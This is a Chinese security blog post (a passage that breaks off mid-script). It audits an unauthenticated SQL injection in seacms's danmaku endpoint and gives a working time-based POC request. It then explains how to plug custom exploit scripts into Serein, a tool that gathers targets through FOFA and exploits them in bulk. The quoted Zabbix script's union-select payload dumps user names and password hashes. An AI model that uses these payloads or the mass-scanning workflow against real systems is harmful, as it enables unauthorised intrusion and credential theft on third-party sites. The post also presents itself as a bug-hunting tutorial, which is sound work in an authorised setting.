---
title: 浅谈代码审计+漏洞批量一把梭哈思路
url: https://mp.weixin.qq.com/s/3j9Q5oZlPOZWzYWKussXIg
source: Doonsec's feed
date: 2026-04-23
fetch_date: 2026-04-24T04:54:13.470872
---

# 浅谈代码审计+漏洞批量一把梭哈思路

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/mwFvjeHDLkiaKyH5oFQdcfT3sibIgLficJ4crG7H7D97VFsgHia7kmk9sGCJL1Uxs29bLkpe2m7012HxJ7ia1mKl8XiagIH8RDtKH6QN79Cny69SE/0?wx_fmt=jpeg)

# 浅谈代码审计+漏洞批量一把梭哈思路

l0\_0l
l0\_0l

蚁景网络安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

## 前言

最近在学习 src 的挖掘，常规的 src 挖掘就是信息泄露，什么逻辑漏洞什么的，什么越权漏洞，但是说实话，挖掘起来不仅需要很多时间，而且还需要很多经验，当然其实还有一种挖掘的办法，就是利用刚出的 1day 去批量扫描，如果自己会代码审计的话，就再好不过了，下面给大家分享分享整个过程是怎么样的

## 工具介绍

项目地址https://github.com/W01fh4cker/Serein

【懒人神器】一款图形化、批量采集 url、批量对采集的 url 进行各种 nday 检测的工具。可用于 src 挖掘、cnvd 挖掘、0day 利用、打造自己的武器库等场景。可以批量利用 Actively Exploited Atlassian Confluence 0Day CVE-2022-26134 和 DedeCMS v5.7.87 SQL 注入 CVE-2022-23337。

具体使用方法下面会介绍

## 漏洞样本

本次选取的是一个前些天看到的 seacms 的一个 sql 注入，当时也是自己也审计了一波的

这里给出审计的过程

### /js/player/dmplayer/dmku/index.php 未授权 sql 注入

这个相比于上一个来说是危害更大，因为不需要登录 admin 用户

![image-20240820170525672](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxMVJWToKckHykZchZqYTPZdrk06uRfMV6nS362mN2uZx9QLaibS0vkNGGSfxdK8UO5WvEMLicwdwrg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0 "null")

确实是 sleep 了，说明漏洞存在，我们看到代码

```
if ($_GET['ac'] == "edit") {
    $cid = $_POST['cid'] ?: showmessage(-1, null);
    $data = $d->编辑弹幕($cid) ?:  succeedmsg(0, '完成');
    exit;
}
```

我们跟进编辑弹幕方法

一路来到

```
public static function 编辑_弹幕($cid)
    {
        try {
            global $_config;
            $text = $_POST['text'];
            $color = $_POST['color'];
            $conn = @new mysqli($_config['数据库']['地址'], $_config['数据库']['用户名'], $_config['数据库']['密码'], $_config['数据库']['名称'], $_config['数据库']['端口']);

            $sql = "UPDATE sea_danmaku_list SET text='$text',color='$color' WHERE cid=$cid";
            $result = "UPDATE sea_danmaku_report SET text='$text',color='$color' WHERE cid=$cid";
            $conn->query($sql);
            $conn->query($result);
        } catch (PDOException $e) {
            showmessage(-1, '数据库错误:' . $e->getMessage());
        }
    }
```

这里我们可以看到查询又是使用的原生的 query 方法，所以并没有过滤

所以导致 sql 注入

还有我们看到当 ac=del，type=list 的时候

```
else if ($_GET['ac'] == "del") {
        $id = $_GET['id'] ?: succeedmsg(-1, null);
        $type = $_GET['type'] ?: succeedmsg(-1, null);
        $data = $d->删除弹幕($id) ?: succeedmsg(0, []);
        succeedmsg(23, true);
```

进入删除弹幕($id)

```
public function 删除弹幕($id)
    {
        //sql::插入_弹幕($data);
        sql::删除_弹幕数据($id);
    }
```

进入 sql::删除\_弹幕数据($id);

```
public static function 删除_弹幕数据($id)
    {
        try {
            global $_config;
            $conn = @new mysqli($_config['数据库']['地址'], $_config['数据库']['用户名'], $_config['数据库']['密码'], $_config['数据库']['名称'], $_config['数据库']['端口']);
            $conn->set_charset('utf8');
            if ($_GET['type'] == "list") {
                $sql = "DELETE FROM sea_danmaku_report WHERE cid={$id}";
                $result = "DELETE FROM sea_danmaku_list WHERE cid={$id}";
                $conn->query($sql);
                $conn->query($result);
            } elseif ($_GET['type'] == "report") {
                $sql = "DELETE FROM sea_danmaku_report WHERE cid={$id}";
                $conn->query($sql);
            }
        } catch (PDOException $e) {
            showmessage(-1, '数据库错误:' . $e->getMessage());
        }
    }
```

我们的 id 是可以控制的，type 也是可以控制的，而且没有任何的过滤，当 type=list 的时候，直接放进 query 函数进行查询

漏洞验证

POC

```
GET /js/player/dmplayer/dmku/index.php?ac=del&id=(select(1)from(select(sleep(6)))x)&type=list HTTP/1.1
Host: seacms:8181
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://seacms:8181/js/player/dmplayer/dmku/index.php?ac=del&id=(select(1)from(select(sleep(0)))x)&type=list
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=5dl35hp50uj606p52se8kg91a2; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D; XDEBUG_SESSION=PHPSTORM
Connection: keep-alive
```

效果如图，可以发现确实延迟了 6 秒

![图片](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxMVJWToKckHykZchZqYTPZHUVib4pMZh5rV7CJ3asoFDrxbE4MJSdicricPxNQP89SDSAjl7EEJUD5g/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=1 "null")

## 工具利用过程

首先就是看工具的逻辑是如何添加漏洞的

首先看主文件

代码很长，说一下我们需要注意的点，首先就是配置,对于的 fofa 配置如下

需要你进入工具的时候配置邮箱和 key

```
def fofa_saveit_first():
    email = fofa_text1.get()
    key = fofa_text2.get()
    with open("fofa配置.conf","a+") as f:
        f.write(f"[data]\nemail={email}\nkey={key}")
        f.close()
    showinfo("保存成功！","请继续使用fofa搜索模块！下一次将自动读取，不再需要配置！")
    text3.insert(END,f"【+】保存成功！请继续使用fofa搜索模块！下一次将会自动读取，不再需要配置！您的email是：{email}；为保护您的隐私，api-key不会显示。\n")
    text3.see(END)
    fofa_info.destroy()
def fofa_saveit_twice():
    global email_r,key_r
    if not os.path.exists("fofa配置.conf"):
        fofa_saveit_first()
    else:
        email_r = getFofaConfig("data", "email")
        key_r = getFofaConfig("data", "key")
def fofa_info():
    global fofa_info,fofa_text1,fofa_text2,fofa_text3
    fofa_info= tk.Tk()
    fofa_info.title("fofa配置")
    fofa_info.geometry('230x100')
    fofa_info.resizable(0, 0)
    fofa_info.iconbitmap('logo.ico')
    fofa_email = tk.StringVar(fofa_info,value="填注册fofa的email")
    fofa_text1 = ttk.Entry(fofa_info, bootstyle="success", width=30, textvariable=fofa_email)
    fofa_text1.grid(row=0, column=1, padx=5, pady=5)
    fofa_key = tk.StringVar(fofa_info,value="填email对应的key")
    fofa_text2 = ttk.Entry(fofa_info, bootstyle="success", width=30, textvariable=fofa_key)
    fofa_text2.grid(row=1, column=1, padx=5, pady=5)
    button1 = ttk.Button(fofa_info, text="点击保存", command=fofa_saveit_twice, width=30, bootstyle="info")
    button1.grid(row=2, column=1, padx=5, pady=5)
    fofa_info.mainloop()
```

使用 fofa 的处理流程

![image-20241018135727613](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxMVJWToKckHykZchZqYTPZpZtn6sMh7SRPiaDlg4mWeiaNMxctpOZYicP31MSMFibCtXPiboQRSMoYibvQ/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=2 "null")

后续是通过 fofa 的 api 进行查询的，所以需要你的 api，只有 vip 才有这个功能

然后下面是脚本调用逻辑

因为一个漏洞是需要你自己写一个 python 脚本的

然后加入你自己自定义的漏洞是在

![image-20241018140142362](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxMVJWToKckHykZchZqYTPZ7B4zRcXibpK0Sq7wJYgWGicLxg4qdtyNk8wWchpFsLRecbSWiblKpPG2g/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=3 "null")

这个逻辑应该很好理解，比如我的就是

```
button50 = ttk.Button(group3,text="seacms前台sql注入",command=sql_injection_gui,width=45,bootstyle="primary")
button50.grid(row=15,column=2,columnspan=2,padx=5,pady=5)
```

然后就是写对应的利用脚本了

因为我们写的脚本是需要贴合工具的，所以先随便找一个脚本看看大概的架构是怎么样的

![image-20241018140341414](https://mmbiz.qpic.cn/mmbiz_png/5znJiaZxqldxMVJWToKckHykZchZqYTPZnSRChI1wDRhj8nsTxaCia9LcU2kUdYmrpN0DEZicxI7Y4lGWLWXnW6bQ/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=4 "null")

工具自带了许许多多的利用脚本，我们看一下如何仿写

比如 zabbix\_sql.py

```
import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
"""
Zabbix ‘popup.php’SQL注入漏洞
http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201112-017
Zabbix的popup.php中存在SQL注入漏洞。远程攻击者可借助only_hostid参数执行任意SQL命令。
"""
def zabbix_sql_exp(url):
    poc = r"""popup.php?dstfrm=form_scenario&dstfld1=application&srctbl=applications&srcfld1=name&only_hostid=1))%20union%20select%201,group_concat(surname,0x2f,passwd)%20from%20users%23"""
    target_url = url + poc
    status_str= ['Administrator', 'User']
    try:
        res = requests.get(url, Verify=False,timeout=3)
        if res.status_code == 200:
            target_url_payload = f"{target_url}"
            res = requests.get(url=target_url_payload,Verify=False)
            if res.status_code == 200:
                for i in range(len(status_str)):
                    if status_str[i] in res.text:
         ...